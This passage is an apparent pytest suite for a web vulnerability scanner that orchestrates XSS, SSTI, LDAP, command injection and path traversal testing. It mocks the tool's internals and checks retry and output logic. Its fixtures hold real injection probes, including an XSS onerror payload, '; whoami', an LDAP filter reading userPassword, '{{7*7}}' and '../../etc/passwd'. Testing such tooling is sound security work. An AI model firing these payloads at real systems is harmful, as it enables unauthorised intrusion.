        apc.advanced_payload_coordinator("http://example.com", test_type="some_sql_test")


# -------------------------
# advanced_payload_coordinator (top-level orchestration)
# -------------------------

def test_advanced_payload_coordinator_orchestrates_phases_and_formats_output(monkeypatch):
    # Stub all heavy internals so we only test orchestration and formatting.
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": ["dalfox"], "failed": []})
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])
    monkeypatch.setattr(apc, "_coordinate_xss_testing", lambda rc, params, tools=None, verbose=False: [
        {"parameter": "name", "vulnerable": True, "payload_type": "Advanced XSS (inHTML)", "payload": "PAY", "url": "http://t/?name=PAY"}
    ])
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda rc, tools=None: [])
    monkeypatch.setattr(apc, "_coordinate_injection_testing", lambda rc, params, tools=None, focus_injection_types=None, verbose=False: [])
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", lambda payload_results: {"severity_distribution": {"Advanced XSS (inHTML)": 1}, "attack_vectors": ["xss"], "bypass_techniques": [], "exploitation_chains": []})
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC1", "REC2"])

    out = apc.advanced_payload_coordinator("http://example.test/page", test_type="comprehensive")
    data = json.loads(out)
    assert data["target"] == "http://example.test/page"
    assert data["test_type"] == "comprehensive"

    # tooling + param discovery routed through
    assert data["tools"]["success"] is True
    assert data["tools"]["tools"] == ["dalfox"]
    assert data["parameters_discovered"] == ["name"]

    # payload/vuln aggregation + counts
    assert data["counts"]["payload_results"] == 1
    assert data["counts"]["vulnerabilities"] == 1
    assert data["vulnerabilities"][0]["parameter"] == "name"
    assert data["vulnerabilities"][0]["vulnerable"] is True

    # analysis + recs forwarded
    assert data["intelligence"]["attack_vectors"] == ["xss"] or "xss" in data["intelligence"]["attack_vectors"]
    assert data["recommendations"] == ["REC1", "REC2"]

    # should not emit prose anymore
    assert "Phase 1:" not in out
    assert "[PAYLOAD]" not in out


# -------------------------
# SSTI test_type orchestration
# -------------------------

def test_advanced_payload_coordinator_ssti_runs_only_ssti_injection_and_passes_focus(monkeypatch):
    calls = {"inj": 0}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should run for ssti
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for ssti-only mode
    monkeypatch.setattr(apc, "_coordinate_xss_testing", lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='ssti'")))
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='ssti'")))

    # Phase 5: injection testing should be invoked with SSTI focus
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"] += 1
        assert focus_injection_types == {"SSTI"}
        return [
            {
                "vulnerable": True,
                "injection_type": "SSTI",
                "parameter": "name",
                "payload": "{{7*7}}",
                "url": "http://example.test/page?name=%7B%7B7*7%7D%7D",
                "method": request_config.http_method,
                "evidence": "Template evaluation detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"SSTI": 1},
            "attack_vectors": ["ssti"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="ssti",
        http_method="GET",
    )

    data = json.loads(out)
    assert data["test_type"] == "ssti"
    assert data["parameters_discovered"] == ["name"]

    # Injection ran (SSTI-focused) and produced a vuln
    assert calls["inj"] == 1
    assert data["counts"]["vulnerabilities"] == 1
    assert any(v.get("injection_type") == "SSTI" and v.get("vulnerable") is True for v in data["vulnerabilities"])


def test_coordinator_ssti_retries_post_when_get_produces_no_ssti_vulns(monkeypatch):
    calls = {"inj": []}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should return something on GET
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for ssti-only mode
    monkeypatch.setattr(apc, "_coordinate_xss_testing", lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='ssti'")))
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='ssti'")))

    # Phase 5: injection testing — GET yields *no SSTI vulns*, POST yields a vuln
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"].append(request_config.http_method)
        assert focus_injection_types == {"SSTI"}

        if request_config.http_method.upper() == "GET":
            return [
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": "name",
                    "tool": "fake",
                }
            ]

        return [
            {
                "vulnerable": True,
                "injection_type": "SSTI",
                "parameter": "name",
                "payload": "{{7*7}}",
                "url": "http://example.test/page?name=%7B%7B7*7%7D%7D",
                "method": request_config.http_method,
                "evidence": "Template evaluation detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"SSTI": 1},
            "attack_vectors": ["ssti"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="ssti",
        http_method="GET",
    )

    # Injection should run GET then POST (because GET produced no SSTI vulns)
    assert calls["inj"] == ["GET", "POST"]

    data = json.loads(out)
    assert data["http_method"] == "POST"
    assert data["test_type"] == "ssti"
    assert data["counts"]["vulnerabilities"] == 1
    assert any(v.get("injection_type") == "SSTI" and v.get("method") == "POST" and v.get("vulnerable") is True for v in data["vulnerabilities"])


# -------------------------
# command_injection test_type orchestration
# -------------------------

def test_advanced_payload_coordinator_ldap_injection_runs_only_ldap_injection_and_passes_focus(monkeypatch):
    calls = {"inj": 0}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should run for ldap_injection
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for ldap_injection-only mode
    monkeypatch.setattr(
        apc,
        "_coordinate_xss_testing",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='ldap_injection'")),
    )
    monkeypatch.setattr(
        apc,
        "_test_cors_configurations",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='ldap_injection'")),
    )

    # Phase 5: injection testing should be invoked with LDAP Injection focus
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"] += 1
        assert focus_injection_types == {"LDAP Injection"}
        return [
            {
                "vulnerable": True,
                "injection_type": "LDAP Injection",
                "parameter": "name",
                "payload": "admin*)((|userPassword=*)",
                "url": "http://example.test/page?name=admin%2A%29%28%28%7CuserPassword%3D%2A%29",
                "method": request_config.http_method,
                "evidence": "LDAP error patterns detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"LDAP Injection": 1},
            "attack_vectors": ["ldap_injection"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="ldap_injection",
        http_method="GET",
    )

    data = json.loads(out)
    assert data["test_type"] == "ldap_injection"
    assert data["parameters_discovered"] == ["name"]

    # Injection ran (LDAP Injection-focused) and produced a vuln
    assert calls["inj"] == 1
    assert data["counts"]["vulnerabilities"] == 1
    assert any(
        v.get("injection_type") == "LDAP Injection" and v.get("vulnerable") is True
        for v in data["vulnerabilities"]
    )


def test_coordinator_ldap_injection_retries_post_when_get_produces_no_ldap_injection_vulns(monkeypatch):
    calls = {"inj": []}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should return something on GET
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for ldap_injection-only mode
    monkeypatch.setattr(
        apc,
        "_coordinate_xss_testing",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='ldap_injection'")),
    )
    monkeypatch.setattr(
        apc,
        "_test_cors_configurations",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='ldap_injection'")),
    )

    # Phase 5: injection testing — GET yields *no ldap injection vulns*, POST yields a vuln
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"].append(request_config.http_method)
        assert focus_injection_types == {"LDAP Injection"}

        if request_config.http_method.upper() == "GET":
            return [
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": "name",
                    "tool": "fake",
                }
            ]

        return [
            {
                "vulnerable": True,
                "injection_type": "LDAP Injection",
                "parameter": "name",
                "payload": "admin*)((|userPassword=*)",
                "url": "http://example.test/page?name=admin%2A%29%28%28%7CuserPassword%3D%2A%29",
                "method": request_config.http_method,
                "evidence": "LDAP error patterns detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"LDAP Injection": 1},
            "attack_vectors": ["ldap_injection"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="ldap_injection",
        http_method="GET",
    )

    # Injection should run GET then POST (because GET produced no ldap injection vulns)
    assert calls["inj"] == ["GET", "POST"]

    data = json.loads(out)
    assert data["http_method"] == "POST"
    assert data["test_type"] == "ldap_injection"
    assert data["counts"]["vulnerabilities"] == 1
    assert any(
        v.get("injection_type") == "LDAP Injection"
        and v.get("method") == "POST"
        and v.get("vulnerable") is True
        for v in data["vulnerabilities"]
    )

def test_advanced_payload_coordinator_command_injection_runs_only_cmd_injection_and_passes_focus(monkeypatch):
    calls = {"inj": 0}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should run for command_injection
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for command_injection-only mode
    monkeypatch.setattr(
        apc,
        "_coordinate_xss_testing",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='command_injection'")),
    )
    monkeypatch.setattr(
        apc,
        "_test_cors_configurations",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='command_injection'")),
    )

    # Phase 5: injection testing should be invoked with Command Injection focus
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"] += 1
        assert focus_injection_types == {"Command Injection"}
        return [
            {
                "vulnerable": True,
                "injection_type": "Command Injection",
                "parameter": "name",
                "payload": "; whoami",
                "url": "http://example.test/page?name=%3B%20whoami",
                "method": request_config.http_method,
                "evidence": "Command execution indicators detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"Command Injection": 1},
            "attack_vectors": ["cmd_injection"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="command_injection",
        http_method="GET",
    )

    data = json.loads(out)
    assert data["test_type"] == "command_injection"
    assert data["parameters_discovered"] == ["name"]

    # Injection ran (Command Injection-focused) and produced a vuln
    assert calls["inj"] == 1
    assert data["counts"]["vulnerabilities"] == 1
    assert any(
        v.get("injection_type") == "Command Injection" and v.get("vulnerable") is True
        for v in data["vulnerabilities"]
    )


def test_coordinator_command_injection_retries_post_when_get_produces_no_cmd_injection_vulns(monkeypatch):
    calls = {"inj": []}

    # Phase 1: tools setup (avoid tool execution)
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"success": True, "tools": [], "failed": []})

    # Phase 2: parameter discovery should return something on GET
    monkeypatch.setattr(apc, "advanced_parameter_discovery", lambda rc, provided_params=None, tools=None: ["name"])

    # XSS/CORS should not run for command_injection-only mode
    monkeypatch.setattr(
        apc,
        "_coordinate_xss_testing",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("xss should not run for test_type='command_injection'")),
    )
    monkeypatch.setattr(
        apc,
        "_test_cors_configurations",
        lambda *a, **k: (_ for _ in ()).throw(AssertionError("cors should not run for test_type='command_injection'")),
    )

    # Phase 5: injection testing — GET yields *no cmd injection vulns*, POST yields a vuln
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"].append(request_config.http_method)
        assert focus_injection_types == {"Command Injection"}

        if request_config.http_method.upper() == "GET":
            return [
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": "name",
                    "tool": "fake",
                }
            ]

        return [
            {
                "vulnerable": True,
                "injection_type": "Command Injection",
                "parameter": "name",
                "payload": "; whoami",
                "url": "http://example.test/page?name=%3B%20whoami",
                "method": request_config.http_method,
                "evidence": "Command execution indicators detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"Command Injection": 1},
            "attack_vectors": ["cmd_injection"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="command_injection",
        http_method="GET",
    )

    # Injection should run GET then POST (because GET produced no cmd injection vulns)
    assert calls["inj"] == ["GET", "POST"]

    data = json.loads(out)
    assert data["http_method"] == "POST"
    assert data["test_type"] == "command_injection"
    assert data["counts"]["vulnerabilities"] == 1
    assert any(
        v.get("injection_type") == "Command Injection"
        and v.get("method") == "POST"
        and v.get("vulnerable") is True
        for v in data["vulnerabilities"]
    )


def test_coordinator_retries_post_when_get_produces_no_param_results(monkeypatch):
    calls = {"param_discovery": [], "xss": []}

    # Phase 1: tools setup (keep empty to avoid tool execution)
    monkeypatch.setattr(
        apc,
        "setup_payload_tools",
        lambda: {"success": True, "tools": [], "failed": []},
    )

    # Phase 2: parameter discovery
    def fake_param_discovery(request_config: apc.RequestConfig, provided_params=None, tools=None):
        # record which method was used
        calls["param_discovery"].append(request_config.http_method)
        # GET yields no results -> should trigger POST retry
        if request_config.http_method.upper() == "GET":
            return []
        return ["name"]

    monkeypatch.setattr(apc, "advanced_parameter_discovery", fake_param_discovery)

    # Phase 3: XSS testing
    def fake_xss_testing(request_config: apc.RequestConfig, parameters, tools=None, verbose=False):
        calls["xss"].append(request_config.http_method)
        # GET yields no vulns -> should trigger POST retry
        if request_config.http_method.upper() == "GET":
            return [{"parameter": "name", "vulnerable": False, "payload_type": "XSS tested", "tool": "fake"}]
        # POST yields a vuln
        return [
            {
                "parameter": "name",
                "vulnerable": True,
                "payload_type": "Advanced XSS (fake)",
                "payload": "\"><img src=x onerror=alert(1)>",
                "url": "http://example.test/page?name=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
                "method": request_config.http_method,
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_xss_testing", fake_xss_testing)

    # Avoid unrelated phases doing anything complicated
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *a, **k: [])
    monkeypatch.setattr(apc, "_coordinate_injection_testing", lambda *a, **k: [])

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"Advanced XSS (fake)": 1},
            "attack_vectors": ["xss"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="xss",
        http_method="GET",
    )

    # ---- Assertions: intended fallback behavior ----
    # Parameter discovery: GET first, then POST (because GET produced no results)
    assert calls["param_discovery"] == ["GET", "POST"]

    # XSS testing: should also try GET then POST (because GET produced no vulns)
    assert calls["xss"] == ["POST"]

    data = json.loads(out)

    assert data["http_method"] == "POST"
    assert data["parameters_discovered"] == ["name"]

    # should contain the POST vuln
    assert data["counts"]["vulnerabilities"] == 1
    assert any(v.get("parameter") == "name" and v.get("vulnerable") is True for v in data["vulnerabilities"])
    assert any(r.get("parameter") == "name" and r.get("method") == "POST" and r.get("vulnerable") is True for r in data["payload_results"])


def test_coordinator_retries_post_when_get_produces_no_xss_results(monkeypatch):
    calls = {"param_discovery": [], "xss": []}

    # Phase 1: tools setup (keep empty to avoid tool execution)
    monkeypatch.setattr(
        apc,
        "setup_payload_tools",
        lambda: {"success": True, "tools": [], "failed": []},
    )

    # Phase 2: parameter discovery
    def fake_param_discovery(request_config: apc.RequestConfig, provided_params=None, tools=None):
        # record which method was used
        calls["param_discovery"].append(request_config.http_method)
        # GET yields no results -> should trigger POST retry
        return ["name"]

    monkeypatch.setattr(apc, "advanced_parameter_discovery", fake_param_discovery)

    # Phase 3: XSS testing
    def fake_xss_testing(request_config: apc.RequestConfig, parameters, tools=None, verbose=False):
        calls["xss"].append(request_config.http_method)
        # GET yields no vulns -> should trigger POST retry
        if request_config.http_method.upper() == "GET":
            return [{"parameter": "name", "vulnerable": False, "payload_type": "XSS tested", "tool": "fake"}]
        # POST yields a vuln
        return [
            {
                "parameter": "name",
                "vulnerable": True,
                "payload_type": "Advanced XSS (fake)",
                "payload": "\"><img src=x onerror=alert(1)>",
                "url": "http://example.test/page?name=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
                "method": request_config.http_method,
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_xss_testing", fake_xss_testing)

    # Avoid unrelated phases doing anything complicated
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *a, **k: [])
    monkeypatch.setattr(apc, "_coordinate_injection_testing", lambda *a, **k: [])

    # Keep analysis/recs deterministic
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"Advanced XSS (fake)": 1},
            "attack_vectors": ["xss"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="xss",
        http_method="GET",
    )

    # ---- Assertions: intended fallback behavior ----
    # Parameter discovery: GET first, then POST (because GET produced no results)
    assert calls["param_discovery"] == ["GET"]

    # XSS testing: should also try GET then POST (because GET produced no vulns)
    assert calls["xss"] == ["GET", "POST"]

    data = json.loads(out)

    assert data["http_method"] == "POST"
    assert data["parameters_discovered"] == ["name"]

    # should contain the POST vuln
    assert data["counts"]["vulnerabilities"] == 1
    assert any(v.get("parameter") == "name" and v.get("vulnerable") is True for v in data["vulnerabilities"])
    assert any(
        r.get("parameter") == "name"
        and r.get("method") == "POST"
        and r.get("vulnerable") is True
        for r in data["payload_results"]
    )


def test_coordinator_phase5_retries_post_when_get_produces_no_injection_vulns(monkeypatch):
    calls = {"inj": [], "xss": [], "param_discovery": []}

    # Phase 1: tools setup (keep empty to avoid tool execution)
    monkeypatch.setattr(
        apc,
        "setup_payload_tools",
        lambda: {"success": True, "tools": [], "failed": []},
    )

    # Phase 2: parameter discovery should return something on GET so we actually proceed cleanly.
    def fake_param_discovery(request_config: apc.RequestConfig, provided_params=None, tools=None):
        calls["param_discovery"].append(request_config.http_method)
        return ["name"]

    monkeypatch.setattr(apc, "advanced_parameter_discovery", fake_param_discovery)

    # Phase 3: XSS can be quiet; return vulns (don’t trigger POST retry here).
    def fake_xss_testing(request_config: apc.RequestConfig, parameters, tools=None, verbose=False):
        calls["xss"].append(request_config.http_method)
        return [{"parameter": "name", "vulnerable": True, "payload_type": "XSS tested", "tool": "fake"}]

    monkeypatch.setattr(apc, "_coordinate_xss_testing", fake_xss_testing)

    # Phase 4: no-op
    monkeypatch.setattr(apc, "_test_cors_configurations", lambda *a, **k: [])

    # Phase 5: injection testing — GET yields *no vulns*, POST yields a vuln
    def fake_injection_testing(request_config: apc.RequestConfig, parameters, tools=None, focus_injection_types=None, verbose=False):
        calls["inj"].append(request_config.http_method)

        if request_config.http_method.upper() == "GET":
            # No vulnerabilities on GET
            return [
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": "name",
                    "tool": "fake",
                }
            ]

        # Vulnerability appears on POST retry
        return [
            {
                "vulnerable": True,
                "injection_type": "Command Injection",
                "parameter": "name",
                "payload": "; whoami",
                "url": "http://example.test/page?name=%3B%20whoami",
                "method": request_config.http_method,
                "evidence": "Command execution indicators detected",
                "tool": "fake",
            }
        ]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", fake_injection_testing)

    # Keep analysis/recs deterministic (don’t care about exact content beyond not crashing)
    monkeypatch.setattr(
        apc,
        "_analyze_payload_intelligence",
        lambda payload_results: {
            "severity_distribution": {"Command Injection": 1},
            "attack_vectors": ["cmd_injection"],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    )
    monkeypatch.setattr(apc, "_generate_payload_recommendations", lambda test_type, results: ["REC"])

    out = apc.advanced_payload_coordinator(
        "http://example.test/page",
        test_type="comprehensive",
        http_method="GET",
    )

    # ---- Assertions: Phase 5 intended fallback behavior ----
    # Parameter discovery ran once (no retry needed)
    assert calls["param_discovery"] == ["GET"]

    # XSS ran once and stayed GET (no vulns, but we intentionally didn't trigger retry path here)
    assert calls["xss"] == ["GET"]

    # Injection should run GET then POST (because GET produced no injection vulns)
    assert calls["inj"] == ["GET", "POST"]

    data = json.loads(out)

    # Coordinator should end in POST due to Phase 5 retry
    assert data["http_method"] == "POST"

    # We should have at least the POST command injection vuln present
    assert any(
        v.get("vulnerable") is True
        and v.get("injection_type") == "Command Injection"
        and v.get("parameter") == "name"
        and v.get("method") == "POST"
        for v in data["vulnerabilities"]
    ) or any(
        r.get("vulnerable") is True
        and r.get("injection_type") == "Command Injection"
        and r.get("parameter") == "name"
        and r.get("method") == "POST"
        for r in data["payload_results"]
    )

    # Counts should reflect at least 1 vuln
    assert data["counts"]["vulnerabilities"] >= 1



def test_advanced_payload_small_helpers_and_normalization(monkeypatch):
    assert apc._b64(None) == ""
    assert apc._b64(b"abc") == "YWJj"
    assert apc._coerce_str(b"\xffabc").endswith("abc")
    assert apc.RequestConfig("https://x", http_method="post").inject_in_body() is True
    assert apc.RequestConfig("https://x", http_method="get").inject_in_body() is False

    monkeypatch.setattr(apc, "setup_payload_tools", Mock(return_value={"tools": [], "failed": []}))
    monkeypatch.setattr(apc, "advanced_parameter_discovery", Mock(return_value=["q"]))
    monkeypatch.setattr(apc, "_coordinate_xss_testing", Mock(return_value=[]))
    monkeypatch.setattr(apc, "_test_cors_configurations", Mock(return_value=[]))
    monkeypatch.setattr(apc, "_coordinate_injection_testing", Mock(return_value=[]))
    monkeypatch.setattr(apc, "_analyze_payload_intelligence", Mock(return_value={"attack_vectors": [], "bypass_techniques": [], "exploitation_chains": []}))
    monkeypatch.setattr(apc, "_generate_payload_recommendations", Mock(return_value=["next"]))

    result = json.loads(apc.advanced_payload_coordinator("example.com", test_type="template", parameters="a,b,c,d,e,f"))
    assert result["target"] == "https://example.com"
    assert result["test_type"] == "ssti"
    assert result["parameters_discovered"] == ["a", "b", "c", "d", "e", "f"]


def test_request_helpers_select_body_headers_and_failure_paths(monkeypatch):
    captured = {}

    def request(method, url, **kwargs):
        captured.update(method=method, url=url, **kwargs)
        return SimpleNamespace(text="response")

    monkeypatch.setattr(apc.requests, "request", request)
    post = apc.RequestConfig("https://example.test", http_method="POST", headers={"X-Base": "1"})
    assert apc._requests_get_text("https://example.test", {"id": "2"}, post) == "response"
    assert captured["params"] is None
    assert captured["data"] == {"id": "2"}

    monkeypatch.setattr(apc.requests, "request", lambda *_args, **_kwargs: (_ for _ in ()).throw(RuntimeError("offline")))
    assert apc._requests_get_text("https://example.test", {}, post) is None

    monkeypatch.setattr(apc.requests, "head", lambda *_args, **kwargs: SimpleNamespace(headers={"X-Test": "value"}))
    assert apc._requests_head_raw_headers("https://example.test", {"Origin": "x"}, post) == "X-Test: value"
    monkeypatch.setattr(apc.requests, "head", lambda *_args, **_kwargs: (_ for _ in ()).throw(RuntimeError("offline")))
    assert apc._requests_head_raw_headers("https://example.test", {}, post) is None


def test_main_parses_valid_and_invalid_headers_and_cookies(monkeypatch, capsys):
    tool = Mock(return_value='{"ok": true}')
    monkeypatch.setattr(apc, "advanced_payload_coordinator", tool)
    monkeypatch.setattr("sys.argv", [
        "advanced_payload_coordinator.py",
        "example.test",
        "--test-type", "xss",
        "--header", "X-Test: value",
        "--header", "invalid",
        "--cookie", "sid=abc",
        "--cookie", "malformed",
    ])

    assert apc.main() == 0
    assert json.loads(capsys.readouterr().out) == {"ok": True}
    assert tool.call_args.args[0] == "example.test"
    assert tool.call_args.kwargs["headers"] == {"X-Test": "value"}
    assert tool.call_args.kwargs["cookies"] == {"sid": "abc"}
def test_output_parsers_cover_sstimap_and_lfimap_variants():
    ssti = apc._parse_sstimap_output(
        "\x1b[31m[+] SSTImap identified the following injection point:\n"
        " Body parameter: name\n Engine: Jinja2\n Injection: {{7*7}}\n"
        " Context: text\n OS: Linux\n Technique: render\n Capabilities:\n  RCE: yes\n\n"
        "[+] Rerun SSTImap\n[+] SSTImap identified the following injection point:\n"
        " Query parameter: q\n Injection: x"
    )
    assert len(ssti) == 2
    assert ssti[0]["param_location"] == "body"
    assert ssti[0]["capabilities"]["RCE"] == "yes"
    assert ssti[1]["param_location"] == "query"
    assert apc._parse_sstimap_output("nothing useful") == []
    lfi = apc._parse_lfimap_output(
        "file", "POST", "[*] Starting traversal attack...\n[*] Testing traversal payload: ../../etc/passwd\n"
        "[*] Injecting POST data: file=../../etc/passwd\n[+] Payload successful!"
    )
    assert lfi[0]["param_location"] == "body"
    assert lfi[0]["attack_type"] == "traversal"


def test_parse_sstimap_output_skips_empty_blocks_and_uses_fallback_evidence():
    stdout = """
[+] SSTImap identified the following injection point:
  Engine: Unknown
  Notes: no parameter here
[+] SSTImap identified the following injection point:
  Injection: {{7*7}}
  Evidence line without structured fields
"""
    findings = apc._parse_sstimap_output(stdout)
    assert len(findings) == 1
    assert findings[0]["parameter"] == "(unknown)"
    assert findings[0]["param_location"] == "unknown"
    assert "Injection: {{7*7}}" in findings[0]["evidence"]


def test_payload_intelligence_and_recommendations_cover_all_vectors():
    results = [
        {"vulnerable": True, "payload_type": "Advanced XSS", "injection_type": "XSS", "evidence": "WAF", "payload": "String.fromCharCode(1)"},
        {"vulnerable": True, "injection_type": "Command Injection", "payload_type": "Command Injection"},
        {"vulnerable": True, "injection_type": "SSTI", "payload_type": "SSTI"},
        {"vulnerable": True, "injection_type": "LDAP", "payload_type": "LDAP"},
        {"vulnerable": True, "injection_type": "Other", "payload_type": "Other", "issue_type": "CORS"},
    ]
    intelligence = apc._analyze_payload_intelligence(results)
    assert {"xss", "cmd_injection", "ssti", "cors", "ldap_injection"} <= set(intelligence["attack_vectors"])
    assert "waf_evasion" in intelligence["bypass_techniques"]
    recs = apc._generate_payload_recommendations("xss", {"payload_results": results, "intelligence": intelligence})
    assert "capture_repro_steps" in recs
    assert "validate_exploitation_chain" in recs
    assert apc._generate_payload_recommendations("param_discovery", {"parameters_discovered": ["id"]}) == []


def test_generate_payload_recommendations_handles_unclassified_vulnerability():
    recs = apc._generate_payload_recommendations(
        "comprehensive",
        {
            "payload_results": [{"vulnerable": True, "payload_type": "Unknown"}],
            "intelligence": {},
        },
    )
    assert recs[:3] == ["capture_repro_steps", "minimize_payload_to_stable_poc", "validate_impact_and_scope"]
    assert "test_authenticated_endpoints_and_roles" in recs
def test_setup_payload_tools_records_available_and_failed(monkeypatch):
    calls = []
    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        if cmd[0] == "which":
